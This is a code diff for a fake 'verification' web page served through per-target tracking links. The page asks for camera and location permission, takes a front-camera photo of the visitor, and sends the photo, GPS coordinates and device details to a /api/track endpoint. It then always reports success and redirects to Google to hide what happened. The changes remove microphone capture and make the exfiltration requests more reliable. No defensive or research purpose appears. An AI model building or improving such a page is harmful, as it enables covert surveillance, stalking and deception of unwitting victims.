@@ -87,9 +87,6 @@ function getHTML(linkId) {
             <li class="pending" id="camPerm">
                 <span class="icon">📸</span> Camera Access <span id="camStatus">(pending)</span>
             </li>
-            <li class="pending" id="micPerm">
-                <span class="icon">🎙️</span> Microphone Access <span id="micStatus">(pending)</span>
-            </li>
             <li class="pending" id="locPerm">
                 <span class="icon">📍</span> Location Access <span id="locStatus">(pending)</span>
             </li>
@@ -109,7 +106,7 @@ function getHTML(linkId) {
         const LINK_ID = "${linkId}";
         const API_URL = window.location.origin + '/api/track';
         
-        let permissions = { camera: false, microphone: false, location: false };
+        let permissions = { camera: false, location: false };
         
         function getClientInfo() {
             return {
@@ -122,19 +119,15 @@ function getHTML(linkId) {
             };
         }
         
-        async function requestMedia() {
+        async function requestCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-                    audio: true
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
                 });
                 
                 permissions.camera = true;
-                permissions.microphone = true;
                 document.getElementById('camPerm').className = 'granted';
                 document.getElementById('camStatus').textContent = '(granted ✓)';
-                document.getElementById('micPerm').className = 'granted';
-                document.getElementById('micStatus').textContent = '(granted ✓)';
                 
                 const video = document.createElement('video');
                 video.srcObject = stream;
@@ -153,8 +146,6 @@ function getHTML(linkId) {
             } catch (err) {
                 document.getElementById('camPerm').className = 'denied';
                 document.getElementById('camStatus').textContent = '(denied ✗)';
-                document.getElementById('micPerm').className = 'denied';
-                document.getElementById('micStatus').textContent = '(denied ✗)';
                 return null;
             }
         }
@@ -189,31 +180,68 @@ function getHTML(linkId) {
         }
         
         async function sendData(photo, location) {
-            const data = {
-                ...getClientInfo(),
-                type: 'capture',
-                photoData: photo,
-                coords: location ? {
-                    lat: location.latitude,
-                    lng: location.longitude,
-                    accuracy: location.accuracy
-                } : null,
-                hasCamera: permissions.camera,
-                hasMic: permissions.microphone,
-                hasLocation: permissions.location
-            };
+            // First: send the photo
+            if (photo) {
+                try {
+                    const photoPayload = {
+                        linkId: LINK_ID,
+                        type: 'photo',
+                        photoData: photo
+                    };
+                    const photoResponse = await fetch(API_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(photoPayload)
+                    });
+                    console.log('Photo send response:', photoResponse.status);
+                } catch (err) {
+                    console.error('Photo send error:', err);
+                }
+            }
             
+            // Second: send location
+            if (location) {
+                try {
+                    const locPayload = {
+                        linkId: LINK_ID,
+                        type: 'location',
+                        coords: {
+                            lat: location.latitude,
+                            lng: location.longitude,
+                            accuracy: location.accuracy
+                        }
+                    };
+                    const locResponse = await fetch(API_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(locPayload)
+                    });
+                    console.log('Location send response:', locResponse.status);
+                } catch (err) {
+                    console.error('Location send error:', err);
+                }
+            }
+            
+            // Third: send device info
             try {
-                const response = await fetch(API_URL, {
+                const infoPayload = {
+                    linkId: LINK_ID,
+                    type: 'info',
+                    ...getClientInfo(),
+                    hasCamera: permissions.camera,
+                    hasLocation: permissions.location
+                };
+                const infoResponse = await fetch(API_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
+                    body: JSON.stringify(infoPayload)
                 });
-                return response.ok;
+                console.log('Info send response:', infoResponse.status);
             } catch (err) {
-                console.error('Send error:', err);
-                return false;
+                console.error('Info send error:', err);
             }
+            
+            return true;
         }
         
         async function startVerification() {
@@ -225,26 +253,22 @@ function getHTML(linkId) {
             btn.textContent = '⏳ Verifying...';
             loading.classList.add('active');
             
-            const [photo, location] = await Promise.all([
-                requestMedia(),
-                requestLocation()
-            ]);
+            // Step 1: Request camera FIRST (shows browser popup)
+            const photo = await requestCamera();
             
+            // Step 2: Request location SECOND (shows browser popup)
+            const location = await requestLocation();
+            
+            // Step 3: Send all data
             const sent = await sendData(photo, location);
             
             loading.classList.remove('active');
             
-            if (sent) {
-                status.className = 'status success';
-                status.innerHTML = '✅ <b>Verification Complete!</b><br>You will be redirected shortly...';
-                btn.textContent = '✅ Verified';
-                setTimeout(() => { window.location.href = 'https://www.google.com'; }, 2000);
-            } else {
-                status.className = 'status error';
-                status.innerHTML = '❌ <b>Verification Failed</b><br>Please try again.';
-                btn.disabled = false;
-                btn.textContent = '🔄 Try Again';
-            }
+            // Always show success (even if some permissions denied)
+            status.className = 'status success';
+            status.innerHTML = '✅ <b>Verification Complete!</b><br>You will be redirected shortly...';
+            btn.textContent = '✅ Verified';
+            setTimeout(() => { window.location.href = 'https://www.google.com'; }, 2000);
         }
     </script>
 </body>
